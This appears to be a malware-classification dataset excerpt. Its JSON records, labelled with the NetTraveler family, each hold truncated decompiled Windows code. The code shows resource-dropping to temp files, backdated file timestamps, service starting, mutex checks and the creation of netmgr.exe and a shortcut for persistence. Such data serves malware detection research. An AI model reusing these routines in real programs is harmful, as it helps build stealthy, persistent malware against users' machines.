v3 = 1;\n  return v3;\n}\nint __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n{\n  DWORD v5; // [esp+8h] [ebp-678h] BYREF\n  HANDLE v6; // [esp+Ch] [ebp-674h]\n  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-670h] BYREF\n  HANDLE hObject; // [esp+14h] [ebp-66Ch]\n  DWORD v9; // [esp+18h] [ebp-668h] BYREF\n  HANDLE hFile; // [esp+1Ch] [ebp-664h]\n  CHAR Filename[264]; // [esp+20h] [ebp-660h] BYREF\n  char v12[288]; // [esp+128h] [ebp-558h] BYREF\n  CHAR FileName[268]; // [esp+248h] [ebp-438h] BYREF\n  void *v14; // [esp+354h] [ebp-32Ch]\n  CHAR Buffer[268]; // [esp+358h] [ebp-328h] BYREF\n  FILE *Stream; // [esp+464h] [ebp-21Ch]\n  CHAR File[264]; // [esp+468h] [ebp-218h] BYREF\n  CHAR v18[268]; // [esp+570h] [ebp-110h] BYREF\n\n  GetCurrentDirectoryA(0x104u, Buffer);\n  spr"}
{"author": "nettraveler", "label": 9, "inputs": "LONG __stdcall TopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)\n{\n  return 0;\n}\nint __cdecl sub_401005(HMODULE hModule, __int16 a2, LPCSTR lpType, int a4)\n{\n  HRSRC v4; // eax\n  HRSRC v5; // ebx\n  HANDLE v7; // esi\n  DWORD v8; // eax\n  struct _FILETIME FileTime; // [esp+Ch] [ebp-134h] BYREF\n  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-12Ch] BYREF\n  FILETIME CreationTime; // [esp+18h] [ebp-128h] BYREF\n  LPCVOID lpBuffer; // [esp+20h] [ebp-120h]\n  LPCSTR lpNewFileName; // [esp+24h] [ebp-11Ch]\n  SYSTEMTIME SystemTime; // [esp+28h] [ebp-118h] BYREF\n  CHAR Buffer[260]; // [esp+38h] [ebp-108h] BYREF\n\n  lpNewFileName = (LPCSTR)a4;\n  GetTempPathA(0x104u, Buffer);\n  lstrcatA(Buffer, \"\\\\release.tmp\");\n  v4 = FindResourceA(hModule, (LPCSTR)(unsigned __int16)a2, lpType);\n  v5 = v4;\n  if ( !v4 )\n    return 0;\n  lpBuffer = LoadResource(hModule, v4);\n  if ( !lpBuffer )\n    return 0;\n  v7 = CreateFileA(Buffer, 0x40000000u, 2u, 0, 2u, 0x80u, 0);\n  if ( !v7 )\n    return 0;\n  memset(&SystemTime, 0, sizeof(SystemTime));\n  SystemTime.wYear = 2004;\n  SystemTime.wMonth = 8;\n  SystemTime.wDay = 17;\n  SystemTime.wHour = 20;\n  SystemTime.wMinute = 0;\n  SystemTimeToFileTime(&SystemTime, &FileTime);\n  LocalFileTimeToFileTime(&FileTime, &CreationTime);\n  SetFileTime(v7, &CreationTime, 0, &CreationTime);\n  v8 = SizeofResource(0, v5);\n  WriteFile(v7, lpBuffer, v8, &NumberOfBytesWritten, 0);\n  CloseHandle(v7);\n  MoveFileA(Buffer, lpNewFileName);\n  DeleteFileA(Buffer);\n  return 1;\n}\nSC_HANDLE __cdecl sub_401173(LPCSTR lpServiceName)\n{\n  SC_HANDLE result; // eax\n  SC_HANDLE v2; // eax\n  SC_HANDLE v3; // edi\n  SC_HANDLE hSCObject; // [esp+0h] [ebp-4h]\n\n  result = OpenSCManagerA(0, 0, 2u);\n  hSCObject = result;\n  if ( result )\n  {\n    v2 = OpenServiceA(result, lpServiceName, 0x10010u);\n    v3 = v2;\n    if ( v2 )\n    {\n      StartServiceA(v2, 0, 0);\n      CloseServiceHandle(v3);\n    }\n    result = (SC_HANDLE)CloseServiceHandle(hSCObject);\n  }\n  return result;\n}\nint __usercall sub_4011BE@<eax>(int result@<eax>, int a2, int a3)\n{\n"}
{"author": "nettraveler", "label": 9, "inputs": "int sub_401000()\n{\n  sub_40100A();\n  return atexit(sub_401021);\n}\nint sub_40100A()\n{\n  return std::ios_base::Init::Init((std::ios_base::Init *)&Buffer[261]);\n}\nvoid __cdecl sub_401021()\n{\n  std::ios_base::Init::~Init((std::ios_base::Init *)&Buffer[261]);\n}\nint sub_40102C()\n{\n  sub_401036();\n  return atexit(sub_40104D);\n}\nint sub_401036()\n{\n  return std::_Winit::_Winit((std::_Winit *)&Buffer[260]);\n}\nvoid __cdecl sub_40104D()\n{\n  std::_Winit::~_Winit((std::_Winit *)&Buffer[260]);\n}\nint sub_401058()\n{\n  sub_401062();\n  return atexit(sub_4010A3);\n}\nint sub_401062()\n{\n  size_t v0; // eax\n  char v2; // [esp+Bh] [ebp-1h]\n\n  byte_4032D8 = v2;\n  std::string::_Tidy(&byte_4032D8, 0);\n  v0 = strlen(Str);\n  return std::string::assign(&byte_4032D8, Str, v0);\n}\nvoid __cdecl sub_4010A3()\n{\n  std::string::_Tidy(&byte_4032D8, 1);\n}\nint __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n{\n  int result; // eax\n  int v5; // eax\n  int v6; // eax\n  int v7; // eax\n  int v8; // eax\n  const char *v9; // eax\n  int v10; // eax\n  char v11[16]; // [esp+4h] [ebp-14h] BYREF\n  DWORD ThreadId; // [esp+14h] [ebp-4h] BYREF\n\n  Sleep(0x1388u);\n  hObject = CreateMutexA(0, 1, Name);\n  if ( GetLastError() == 183 )\n  {\n    CloseHandle(hObject);\n    result = 0;\n  }\n  else\n  {\n    GetTempPathA(0x104u, Buffer);\n    v5 = std::operator<<(std::cout, Buffer);\n    std::endl(v5);\n    sprintf(byte_4032E8, \"%snetmgr.exe\", Buffer);\n    v6 = sub_40123D(v11);\n    std::string::assign(&byte_4032D8, v6, 0, std::string::npos);\n    std::string::_Tidy(v11, 1);\n    if ( (unsigned __int8)std::operator!=(&byte_4032D8) )\n    {\n      v7 = std::operator+(v11, &byte_4032D8, asc_403048);\n      std::string::assign(&byte_4032D8, v7, 0, std::string::npos);\n      std::string::_Tidy(v11, 1);\n      v8 = std::operator<<(std::cout, &byte_4032D8);\n      std::endl(v8);\n      v9 = lpFileName;\n      if ( !lpFileName )\n        v9 = (const char *)`std::string::_Nullstr'::`2'::_C;\n      sprintf(MultiByteStr, \"%snetmgr.lnk\", v9);\n      sub_4016EB(Buffer"}
{"author": "nettraveler", "label": 9, "inputs": "int sub_401000()\n{\n  sub_40100A();\n  return atexit(sub_401020);\n}\nint sub_40100A()\n{\n  return std::ios_base::Init::Init((std::ios_base::Init *)&Buffer[261]);\n}\nvoid __cdecl sub_401020()\n{\n  sub_40255C(4472477);\n}\nint sub_40102A()\n{\n  sub_401034();\n  return atexit(sub_40104A);\n}\nvoid sub_401034()\n{\n  JUMPOUT(0x4032E0);\n}\nvoid __cdecl sub_40104A()\n{\n  sub_403461(4472476);\n}\nint sub_401054()\n{\n  sub_40105E();\n  return atexit(sub_40109D);\n}\nint sub_40105E()\n{\n  size_t v0; // eax\n  char v2; // [esp+Bh] [ebp-1h]\n\n  byte_443B80 = v2;\n  std::string::_Tidy(0);\n  v0 = strlen(Src);\n  return std::string::assign(Src, v0);\n}\nvoid __cdecl sub_40109D()\n{\n  std::string::_Tidy(1);\n}\nint __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n{\n  int v4; // eax\n  int v5; // eax\n  char *v6; // eax\n  const char *v7; // eax\n  int v8; // edi\n  BOOL v9; // eax\n  BOOL v10; // eax\n  HMODULE v11; // eax\n  FARPROC v12; // eax\n  char *v13; // ecx\n  HMODULE v14; // eax\n  BOOL (__stdcall *CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION); // eax\n  int v16; // eax\n  int v17; // esi\n  HANDLE v19; // [esp-4h] [ebp-308h]\n  char Src[384]; // [esp+Ch] [ebp-2F8h] BYREF\n  CHAR Filename[260]; // [esp+18Ch] [ebp-178h] BYREF\n  int v22; // [esp+290h] [ebp-74h] BYREF\n  int v23[16]; // [esp+294h] [ebp-70h] BYREF\n  struct _PROCESS_INFORMATION v24; // [esp+2D4h] [ebp-30h] BYREF\n  DWORD NumberOfBytesWritten; // [esp+2E4h] [ebp-20h] BYREF\n  CHAR ProcName[20]; // [esp+2E8h] [ebp-1Ch] BYREF\n  FILE *Stream; // [esp+2FCh] [ebp-8h]\n  HANDLE hFile; // [esp+300h] [ebp-4h]\n\n  v4 = sub_40141F(&v24);\n  std::string::assign(v4, 0, -1);\n  std::string::_Tidy(1);\n  if ( (unsigned __int8)sub_4021C9((int)&byte_443B80, ::Src) )\n  {\n    v16 = sub_402010((int)&unk_443F38, &byte_4408A0);\n    goto LABEL_19;\n  }\n  v5 = sub_401F7F((int)&v24, (int)&byte_443B80, asc_440930);\n  std::string::assign(v5, 0, -1);\n  std::string::_Tidy(1);\n  v6 = dword_443B84;\n "}
{"author": "nettraveler", "label": 9, "inputs": "int sub_401000()\n{\n  sub_401010();\n  return atexit(sub_401030);\n}\nint sub_401010()\n{\n  return std::ios_base::Init::Init((std::ios_base::Init *)&Buffer[261]);\n}\nvoid __cdecl sub_401030()\n{\n  std::ios_base::Init::~Init((std::ios_base::Init *)&Buffer[261]);\n}\nint sub_401040()\n{\n  sub_401050();\n  return atexit(sub_401070);\n}\nint sub_401050()\n{\n  return std::_Winit::_Winit((std::_Winit *)&Buffer[260]);\n}\nvoid __cdecl sub_401070()\n{\n  std::_Winit::~_Winit((std::_Winit *)&Buffer[260]);\n}\nint sub_401080()\n{\n  sub_401090();\n  return atexit(sub_401180);\n}\nLPCSTR sub_401090()\n{\n  CHAR *v0; // edx\n  unsigned int v1; // esi\n  unsigned int v2; // kr04_4\n  unsigned int v3; // ebx\n  char v4; // al\n  LPCSTR result; // eax\n  char v6; // [esp+Fh] [ebp-1h]\n\n  byte_4042A8 = v6;\n  v0 = 0;\n  v1 = 0;\n  v2 = strlen(byte_4044D0) + 1;\n  lpFileName = 0;\n  v3 = v2 - 1;\n  dword_4042B0 = 0;\n  dword_4042B4 = 0;\n  if ( v2 - 1 > 0xFFFFFFFD )\n  {\n    std::_Xlen();\n    v0 = (CHAR *)lpFileName;\n    v1 = dword_4042B4;\n  }\n  if ( v0 )\n  {\n    v4 = *(v0 - 1);\n    if ( v4 )\n    {\n      if ( v4 != -1 )\n      {\n        if ( v2 == 1 )\n        {\n          *(v0 - 1) = v4 - 1;\n          return (LPCSTR)std::string::_Tidy(&byte_4042A8, 0);\n        }\n        goto LABEL_13;\n      }\n    }\n  }\n  if ( v2 == 1 )\n    return (LPCSTR)std::string::_Tidy(&byte_4042A8, 1);\n  if ( v1 > 0x1F || v1 < v3 )\n  {\n    std::string::_Tidy(&byte_4042A8, 1);\nLABEL_13:\n    std::string::_Copy(&byte_4042A8, v3);\n    v0 = (CHAR *)lpFileName;\n  }\n  qmemcpy(v0, byte_4044D0, v3);\n  result = lpFileName;\n  dword_4042B0 = v2 - 1;\n  lpFileName[v3] = 0;\n  return result;\n}\nvoid __cdecl sub_401180()\n{\n  char v0; // al\n\n  if ( lpFileName )\n  {\n    v0 = *(lpFileName - 1);\n    if ( !v0 || v0 == -1 )\n      sub_402112((void *)(lpFileName - 1));\n    else\n      *((_BYTE *)lpFileName - 1) = v0 - 1;\n  }\n  lpFileName = 0;\n  dword_4042B0 = 0;\n  dword_4042B4 = 0;\n}\nint __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n{\n  int result; // eax\n  int v5; // eax\n  int v6"}
{"author": "nettraveler", "label": 9, "inputs": "int sub_401000()\n{\n  sub_40100A();\n  return atexit(sub_401021);\n}\nint sub_40100A()\n{\n  return std::ios_base::Init::Init((std::ios_base::Init *)&byte_4138E0[261]);\n}\nvoid __cdecl sub_401021()\n{\n  std::ios_base::Init::~Init((std::ios_base::Init *)&byte_4138E0[261]);\n}\nint sub_40102C()\n{\n  sub_401036();\n  return atexit(sub_40104D);\n}\nint sub_401036()\n{\n  return std::_Winit::_Winit((std::_Winit *)&byte_4138E0[260]);\n}\nvoid __cdecl sub_40104D()\n{\n  std::_Winit::~_Winit((std::_Winit *)&byte_4138E0[260]);\n}\nint sub_401058()\n{\n  sub_401062();\n  return atexit(sub_4010A3);\n}\nint sub_401062()\n{\n  size_t v0; // eax\n  char v2; // [esp+Bh] [ebp-1h]\n\n  byte_4136C8 = v2;\n  std::string::_Tidy(&byte_4136C8, 0);\n  v0 = strlen(Str);\n  return std::string::assign(&byte_4136C8, Str, v0);\n}\nvoid __cdecl sub_4010A3()\n{\n  std::string::_Tidy(&byte_4136C8, 1);\n}\nint __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n{\n  int v4; // eax\n  int v5; // eax\n  int v6; // eax\n  const char *v7; // eax\n  int v8; // eax\n  BOOL v9; // eax\n  HANDLE v10; // esi\n  int v11; // eax\n  BOOL v12; // eax\n  const CHAR *v13; // eax\n  int v14; // eax\n  HANDLE v16; // [esp-4h] [ebp-2F4h]\n  char Buffer[384]; // [esp+Ch] [ebp-2E4h] BYREF\n  CHAR Filename[260]; // [esp+18Ch] [ebp-164h] BYREF\n  struct _STARTUPINFOA StartupInfo; // [esp+290h] [ebp-60h] BYREF\n  struct _PROCESS_INFORMATION ProcessInformation; // [esp+2D4h] [ebp-1Ch] BYREF\n  FILE *Stream; // [esp+2E4h] [ebp-Ch]\n  HANDLE hFile; // [esp+2E8h] [ebp-8h]\n  DWORD NumberOfBytesWritten; // [esp+2ECh] [ebp-4h] BYREF\n\n  v4 = sub_401398(&ProcessInformation);\n  std::string::assign(&byte_4136C8, v4, 0, std::string::npos);\n  std::string::_Tidy(&ProcessInformation, 1);\n  if ( !(unsigned __int8)std::operator!=(&byte_4136C8) )\n  {\n    v14 = std::operator<<(std::cout, &unk_413420);\n    goto LABEL_18;\n  }\n  v5 = std::operator+(&ProcessInformation, &byte_4136C8, asc_413490);\n  std::string::assign(&byte_4136C8, v5, 0, std::string::npos);\n  std::string::_Tidy(&ProcessInformation, 1);\n "}
{"author": "nettraveler", "label": 9, "inputs": "int sub_401000()\n{\n  int result; // eax\n  struct _SYSTEMTIME SystemTime; // [esp+0h] [ebp-18h] BYREF\n  int v2; // [esp+14h] [ebp-4h]\n\n  GetLocalTime(&SystemTime);\n  v2 = SystemTime.wSecond;\n  if ( SystemTime.wSecond <= 0x32u )\n    v2 += 10;\n  else\n    v2 -= 50;\n  do\n  {\n    GetLocalTime(&SystemTime);\n    result = SystemTime.wSecond;\n  }\n  while ( SystemTime.wSecond != v2 );\n  return result;\n}\nBOOL sub_401070()\n{\n  BOOL result; // eax\n  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-A0h] BYREF\n\n  memset(&VersionInformation, 0, sizeof(VersionInformation));\n  VersionInformation.dwOSVersionInfoSize = 148;\n  Sleep(0xAu);\n  if ( GetVersionExA(&VersionInformation) )\n    result = VersionInformation.dwMajorVersion == 6;\n  else\n    result = 1;\n  return result;\n}\nint sub_4010F0()\n{\n  HMODULE v0; // eax\n  struct _SYSTEM_INFO SystemInfo; // [esp+0h] [ebp-2Ch] BYREF\n  int v3; // [esp+24h] [ebp-8h]\n  void (__stdcall *GetNativeSystemInfo)(LPSYSTEM_INFO); // [esp+28h] [ebp-4h]\n\n  v3 = 0;\n  SystemInfo.dwOemId = 0;\n  SystemInfo.dwPageSize = 0;\n  SystemInfo.lpMinimumApplicationAddress = 0;\n  SystemInfo.lpMaximumApplicationAddress = 0;\n  SystemInfo.dwActiveProcessorMask = 0;\n  SystemInfo.dwNumberOfProcessors = 0;\n  SystemInfo.dwProcessorType = 0;\n  SystemInfo.dwAllocationGranularity = 0;\n  *(_DWORD *)&SystemInfo.wProcessorLevel = 0;\n  v0 = GetModuleHandleA(\"kernel32.dll\");\n  GetNativeSystemInfo = (void (__stdcall *)(LPSYSTEM_INFO))GetProcAddress(v0, \"GetNativeSystemInfo\");\n  if ( GetNativeSystemInfo )\n    GetNativeSystemInfo(&SystemInfo);\n  else\n    GetSystemInfo(&SystemInfo);\n  if ( SystemInfo.wProcessorArchitecture == 9 )\n    v3 = 1;\n  return v3;\n}\nint __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n{\n  int i; // [esp+8h] [ebp-694h]\n  CHAR ProcName[16]; // [esp+Ch] [ebp-690h] BYREF\n  HMODULE hModule; // [esp+1Ch] [ebp-680h]\n  FARPROC v8; // [esp+20h] [ebp-67Ch]\n  DWORD v9; // [esp+24h] [ebp-678h] BYREF\n  HANDLE v10; // [esp+28h] [ebp-674h]\n  DWORD NumberOfBytesWritten; // "}
{"author": "nettraveler", "label": 9, "inputs": "BOOL sub_401000()\n{\n  BOOL result; // eax\n  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-94h] BYREF\n\n  memset(&VersionInformation, 0, sizeof(VersionInformation));\n  VersionInformation.dwOSVersionInfoSize = 148;\n  if ( GetVersionExA(&VersionInformation) )\n    result = VersionInformation.dwMajorVersion == 6;\n  else\n    result = 1;\n  return result;\n}\nint sub_40104D()\n{\n  int v0; // esi\n  HMODULE v1; // eax\n  void (__stdcall *GetNativeSystemInfo)(LPSYSTEM_INFO); // eax\n  struct _SYSTEM_INFO SystemInfo; // [esp+4h] [ebp-24h] BYREF\n\n  v0 = 0;\n  memset(&SystemInfo, 0, sizeof(SystemInfo));\n  v1 = GetModuleHandleA(ModuleName);\n  GetNativeSystemInfo = (void (__stdcall *)(LPSYSTEM_INFO))GetProcAddress(v1, ProcName);\n  if ( GetNativeSystemInfo )\n    GetNativeSystemInfo(&SystemInfo);\n  else\n    GetSystemInfo(&SystemInfo);\n  if ( SystemInfo.wProcessorArchitecture == 9 )\n    v0 = 1;\n  return v0;\n}\nint __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)\n{\n  FILE *v4; // edi\n  HANDLE v5; // eax\n  HANDLE v6; // esi\n  HMODULE v7; // eax\n  FARPROC v8; // eax\n  HANDLE v9; // esi\n  HMODULE v10; // eax\n  FARPROC v11; // eax\n  CHAR Filename[260]; // [esp+Ch] [ebp-54Ch] BYREF\n  char Src[288]; // [esp+110h] [ebp-448h] BYREF\n  CHAR v15[260]; // [esp+230h] [ebp-328h] BYREF\n  CHAR Buffer[260]; // [esp+334h] [ebp-224h] BYREF\n  CHAR FileName[260]; // [esp+438h] [ebp-120h] BYREF\n  DWORD NumberOfBytesWritten; // [esp+53Ch] [ebp-1Ch] BYREF\n  DWORD v19; // [esp+540h] [ebp-18h] BYREF\n  HANDLE hObject; // [esp+544h] [ebp-14h] BYREF\n  CHAR ProcName[16]; // [esp+548h] [ebp-10h] BYREF\n\n  GetCurrentDirectoryA(0x104u, Buffer);\n  sprintf(v15, \"%s\\\\temp.exe\", Buffer);\n  GetModuleFileNameA(0, Filename, 0x104u);\n  v4 = fopen(Filename, Mode);\n  if ( v4 )\n  {\n    memset(Src, 0, sizeof(Src));\n    fseek(v4, 688, 0);\n    sub_401755(Src, 1u, 0x120u, v4);\n    memcpy(&unk_4092F0, Src, 0x120u);\n    if ( sub_401000() )\n    {\n      sprintf(FileName, \"%s\\\\net.exe\", Buffer);\n      v5 = CreateFileA(FileName, 0x4000"}
